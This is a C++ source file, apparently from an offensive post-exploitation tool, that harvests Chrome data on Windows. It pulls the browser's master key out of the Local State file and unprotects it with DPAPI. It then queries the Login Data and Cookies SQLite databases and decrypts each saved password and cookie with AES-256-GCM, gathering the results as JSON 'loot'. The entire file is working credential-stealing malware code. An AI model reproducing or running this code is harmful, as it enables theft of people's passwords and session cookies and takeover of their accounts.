#include <string>
#include <iostream>
#include <sstream>
#include <windows.h>
#include <dpapi.h>

#include "loot.hpp"
#include "../file_io/file_io.h"
#include "../libs/base64/base64.h"
#include "../libs/sqlite3/sqlite3.h"
#include "../libs/sodium/sodium.h"

using namespace std;

string getEncryptedKey(string userName);
string getLoginDataPath(string userName);
string getCookiesPath(string userName);
void decryptWithAesGcm256(const unsigned char* masterKey,
	unsigned char* encrypted, int encryptedLen, unsigned char* decrypted);
void initializeSodiumLibrary();
json getPasswordRowData(sqlite3_stmt* statement, const unsigned char* masterKey);
json getCookieRowData(sqlite3_stmt* statement, const unsigned char* masterKey);

HMODULE hSqlModule = LoadLibrary(TEXT("../libs/sqlite3/sqlite3.dll"));
HMODULE hSodiumModule = LoadLibrary(TEXT("../libs/sodium/libsodium-23.dll"));

// Define sqlite3 functions
typedef int (*sqlite3_open_t) (const char *filename, sqlite3 **ppDb);
typedef const char* (*sqlite3_errmsg_t) (sqlite3*);
typedef int (*sqlite3_close_t) (sqlite3*);
typedef int (*sqlite3_prepare_v2_t) ( sqlite3 *db, const char *zSql, int nByte,
	sqlite3_stmt **ppStmt, const char **pzTail);
// typedef int (*sqlite3_bind_text_t) (sqlite3_stmt*,int,const char*,int,void(*)(void*));
typedef int (*sqlite3_finalize_t) (sqlite3_stmt *pStmt);
typedef int (*sqlite3_step_t) (sqlite3_stmt*);
typedef const unsigned char* (*sqlite3_column_text_t) (sqlite3_stmt*, int iCol);
typedef int (*sqlite3_column_bytes_t) (sqlite3_stmt*, int iCol);

// Get addresses sqlite3 functions from sqlite3 dll
sqlite3_open_t sqlite3_open_ = (sqlite3_open_t) GetProcAddress(hSqlModule, "sqlite3_open");
sqlite3_errmsg_t sqlite3_errmsg_ = (sqlite3_errmsg_t) GetProcAddress(hSqlModule, "sqlite3_errmsg");
sqlite3_close_t sqlite3_close_ = (sqlite3_close_t) GetProcAddress(hSqlModule, "sqlite3_close");
sqlite3_prepare_v2_t sqlite3_prepare_v2_ = (sqlite3_prepare_v2_t) GetProcAddress(hSqlModule, "sqlite3_prepare_v2");
// sqlite3_bind_text_t sqlite3_bind_text_ = (sqlite3_bind_text_t) GetProcAddress(hSqlModule, "sqlite3_bind_text");
sqlite3_finalize_t sqlite3_finalize_ = (sqlite3_finalize_t) GetProcAddress(hSqlModule, "sqlite3_finalize");
sqlite3_step_t sqlite3_step_ = (sqlite3_step_t) GetProcAddress(hSqlModule, "sqlite3_step");
sqlite3_column_text_t sqlite3_column_text_ = (sqlite3_column_text_t) GetProcAddress(hSqlModule, "sqlite3_column_text");
sqlite3_column_bytes_t sqlite3_column_bytes_ = (sqlite3_column_bytes_t) GetProcAddress(hSqlModule, "sqlite3_column_bytes");

// Define crypto_aead_aes256gcm_decrypt
typedef int (*crypto_aead_aes256gcm_decrypt_t) (unsigned char *m,
	unsigned long long *mlen_p, unsigned char *nsec,
	const unsigned char *c, unsigned long long clen,
	const unsigned char *ad, unsigned long long adlen,
	const unsigned char *npub, const unsigned char *k);

// Get address of crypto_aead_aes256gcm_decrypt from sodium dll
crypto_aead_aes256gcm_decrypt_t crypto_aead_aes256gcm_decrypt_
	= (crypto_aead_aes256gcm_decrypt_t)
		GetProcAddress(hSodiumModule, "crypto_aead_aes256gcm_decrypt");

// Master key used for decrypting user passwords stored in Login Data sql file
void getMasterKey(unsigned char* masterKey, string userName) {
	string encryptedKey = getEncryptedKey(userName);

	vector<BYTE> base64Decrypted = base64_decode(encryptedKey);

	DWORD cbData = base64Decrypted.size() - 5;
	BYTE* dpapiEncrypted = new BYTE[cbData];
	copy(base64Decrypted.begin() + 5, base64Decrypted.end(), dpapiEncrypted);

	DATA_BLOB dataIn;
	DATA_BLOB dataOut;

	dataIn.pbData = dpapiEncrypted;
	dataIn.cbData = cbData;

	// DPAPI decrypt
	bool decryptSuccess =
		CryptUnprotectData(&dataIn, nullptr, nullptr, nullptr, nullptr, 0, &dataOut);

	delete[] dpapiEncrypted;

	if (!decryptSuccess) {
		cout << "Failed to decrypt" << endl;
		return;
	}

	memcpy(masterKey, dataOut.pbData, dataOut.cbData);
	LocalFree(dataOut.pbData);
}

void printUCharAsHex(unsigned char* uChar, int len) {
	// Source: https://stackoverflow.com/questions/10451493/how-to-print-unsigned-char-as-hex-in-c
	// eigenfield's answer

	for (int i = 0; i < len; i++) {
    std::cout << std::setfill('0')
      << std::setw(2)
      << std::uppercase
      << std::hex << (0xFF & uChar[i]) << " ";
	}
}

json lootChromePasswords(const unsigned char* masterKey, string userName) {

	json lootResult = json::array();

	// Initialize sodium library to use crypto_aead_aes256gcm_decrypt
	initializeSodiumLibrary();

	// Get dbFile path
	string loginDataPath = getLoginDataPath(userName);
	int pathLen = loginDataPath.length();
	char dbFile[pathLen + 1];
	strncpy(dbFile, loginDataPath.c_str(), pathLen);
	dbFile[pathLen] = '\0';

	sqlite3 *db = nullptr;
	char *zErrMsg = 0;
	int errorCode = 0;

	// Open database
	errorCode = sqlite3_open_(dbFile, &db);

	if (errorCode) {
		fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg_(db));
		json error = "Error";
		return error;
	} else {
		fprintf(stderr, "Opened database successfully\n");
	}

	// Create SQL statement
	// Source: https://stackoverflow.com/questions/27383724/sqlite3-prepare-v2-sqlite3-exec
	// Rob's answer
	sqlite3_stmt* statement;
	const char* statementStr = "SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created";
	if (sqlite3_prepare_v2_(db, statementStr, -1, &statement, NULL) != SQLITE_OK) {
    cout << "Prepare failure: %s\n" << sqlite3_errmsg_(db) << endl;
		json error = "Error";
		return error;
	}

	// Get results of statement
	int stepResult;

	while ((stepResult = sqlite3_step_(statement)) == SQLITE_ROW) {
		json rowData = getPasswordRowData(statement, masterKey);
		lootResult.push_back(rowData);
	}

	if (stepResult != SQLITE_DONE) {
    cout << "Step failure: %s\n" << sqlite3_errmsg_(db) << endl;
	}

	sqlite3_finalize_(statement);
  sqlite3_close_(db);

	return lootResult;
}


json lootChromeCookies(const unsigned char* masterKey, string userName) {
	// Initialize sodium library to use crypto_aead_aes256gcm_decrypt
	initializeSodiumLibrary();
	json lootResult = json::array();

	// Get dbFile path
	string cookiesPath = getCookiesPath(userName);
	int pathLen = cookiesPath.length();
	char dbFile[pathLen + 1];
	strncpy(dbFile, cookiesPath.c_str(), pathLen);
	dbFile[pathLen] = '\0';

	sqlite3 *db = nullptr;
	char *zErrMsg = 0;
	int errorCode = 0;

	// Open database
	errorCode = sqlite3_open_(dbFile, &db);

	if (errorCode) {
		fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg_(db));
		json j = "error";
		return j;
	} else {
		fprintf(stderr, "Opened database successfully\n");
	}

	sqlite3_stmt* statement;
	const char* statementStr = "SELECT host_key, name, encrypted_value, path, expires_utc, source_port FROM cookies ORDER BY host_key";
	if (sqlite3_prepare_v2_(db, statementStr, -1, &statement, NULL) != SQLITE_OK) {
    cout << "Prepare failure: %s\n" << sqlite3_errmsg_(db) << endl;
		json j = "error";
		return j;
	}

	int stepResult;

	while ((stepResult = sqlite3_step_(statement)) == SQLITE_ROW) {
		json rowData = getCookieRowData(statement, masterKey);
		lootResult.push_back(rowData);
	}

	if (stepResult != SQLITE_DONE) {
    cout << "Step failure: %s\n" << sqlite3_errmsg_(db) << endl;
	}

	sqlite3_finalize_(statement);
  sqlite3_close_(db);
	return lootResult;
}

// Get the encrypted key stored at Local State file
// Need to decrypt it with Base64 and then DPAPI to get the master key for decrypting user passwords
string getEncryptedKey(string userName) {
  std::ostringstream stream;
  stream << "C:\\Users\\" << userName << "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";

	int len = stream.str().length();
	char filePath[len + 1];
  strncpy(filePath, stream.str().c_str(), len);
	filePath[len] = '\0';

	FileIO fileIO = FileIO();
	fileIO.ReadFileContent(filePath);
	char* fileContent = fileIO.fileContentBuf;

	string fileContentAsString(fileContent);

	json fileJson = json::parse(fileContentAsString);
	string encryptedKey = fileJson["os_crypt"]["encrypted_key"];

	return encryptedKey;
}

// This path stores website login info (url, username, password)
string getLoginDataPath(string userName) {
	std::ostringstream stream;
  stream << "C:\\Users\\"
		<< userName
		<< "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";

	string path = stream.str();
	return path;
}

string getCookiesPath(string userName) {
	std::ostringstream stream;
  stream << "C:\\Users\\"
		<< userName
		<< "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";

	string path = stream.str();
	return path;
}

// Login Data contains encrypted passwords, need to decrypt using master key
void decryptWithAesGcm256(const unsigned char* masterKey,
	unsigned char* encrypted, int encryptedLen, unsigned char* decrypted) {

	// Prepare parameters for decryption function
	unsigned long long decryptedLen = 0;

	int ivLen = 12;
	BYTE iv[ivLen];
	memcpy(iv, &encrypted[3], ivLen);

	int ciphertextLen = ((int) encryptedLen) - 15;
	BYTE ciphertext[ciphertextLen];

	memset(ciphertext, 0, ciphertextLen);
	memcpy(ciphertext, &encrypted[15], ciphertextLen);

	// Reference: https://libsodium.gitbook.io/doc/secret-key_cryptography/aead/aes-256-gcm#example-combined-mode
	// Decrypt to get user's password
	bool decryptFailed = crypto_aead_aes256gcm_decrypt_(
		decrypted,
		&decryptedLen,
		NULL,
		(const unsigned char*) ciphertext,
		(unsigned long long) ciphertextLen,
		NULL,
		0,
		(const unsigned char*) iv,
		(const unsigned char*) masterKey
	);

	if (decryptFailed) {
		cout << "crypto_aead_aes256gcm_decrypt failed" << endl;
	}

	decrypted[decryptedLen] = '\0';
}

void initializeSodiumLibrary() {
	typedef int (*sodium_init_t) (void);
	typedef int (*crypto_aead_aes256gcm_is_available_t) (void);

	sodium_init_t sodium_init
		= (sodium_init_t) GetProcAddress(hSodiumModule, "sodium_init");
	crypto_aead_aes256gcm_is_available_t crypto_aead_aes256gcm_is_available
		= (crypto_aead_aes256gcm_is_available_t)
			GetProcAddress(hSodiumModule, "crypto_aead_aes256gcm_is_available");

	// Initialize sodium library, used for crypto_aead_aes256gcm_decrypt
	if (sodium_init() < 0) {
		cout << "Unable to initialize sodium, will be unable to use crypto_aead_aes256gcm_decrypt." << endl;
  }

	if (crypto_aead_aes256gcm_is_available() == 0) {
		cout << "Unable to use crypto_aead_aes256gcm on this CPU." << endl;
    abort(); /* Not available on this CPU */
	}
}

json getPasswordRowData(sqlite3_stmt* statement, const unsigned char* masterKey) {

	unsigned char* original_url = (unsigned char*) sqlite3_column_text_(statement, 0);
	unsigned char* username_value = (unsigned char*) sqlite3_column_text_(statement, 1);
	unsigned char* password_value = (unsigned char*) sqlite3_column_text_(statement, 2);
	int passwordLen = sqlite3_column_bytes_(statement, 2);

	unsigned char decryptedPassword[50];
	decryptWithAesGcm256(masterKey, password_value, passwordLen, decryptedPassword);

	string originalUrl(reinterpret_cast<char*>(original_url));
	string usernameValue(reinterpret_cast<char*>(username_value));
	string passwordValue(reinterpret_cast<char*>(decryptedPassword));

	json rowData = {
		{"original_url", originalUrl},
		{"username_value", usernameValue},
		{"password_value", passwordValue}
	};

	return rowData;
}

json getCookieRowData(sqlite3_stmt* statement, const unsigned char* masterKey) {

	unsigned char* host_key = (unsigned char*) sqlite3_column_text_(statement, 0);
	unsigned char* name = (unsigned char*) sqlite3_column_text_(statement, 1);
	unsigned char* encrypted_value = (unsigned char*) sqlite3_column_text_(statement, 2);
	unsigned char* path = (unsigned char*) sqlite3_column_text_(statement, 3);
	unsigned char* expires_utc = (unsigned char*) sqlite3_column_text_(statement, 4);
	unsigned char* source_port = (unsigned char*) sqlite3_column_text_(statement, 5);
	int encrypted_value_len = sqlite3_column_bytes_(statement, 2);

	unsigned char decryptedValue[1000];
	decryptWithAesGcm256(masterKey, encrypted_value, encrypted_value_len, decryptedValue);

	// Convert to strings so that they could be added to a json structure
	string host_key_s(reinterpret_cast<char*>(host_key));
	string name_s(reinterpret_cast<char*>(name));
	string decrypted_value_s(reinterpret_cast<char*>(decryptedValue));
	string path_s(reinterpret_cast<char*>(path));
	string expires_utc_s(reinterpret_cast<char*>(expires_utc));
	string source_port_s(reinterpret_cast<char*>(source_port));

	json rowData = {
		{"host_key", host_key_s},
		{"name", name_s},
		{"decrypted_value", decrypted_value_s},
		{"path", path_s},
		{"expires_utc", expires_utc_s},
		{"source_port", source_port_s}
	};

	return rowData;
}
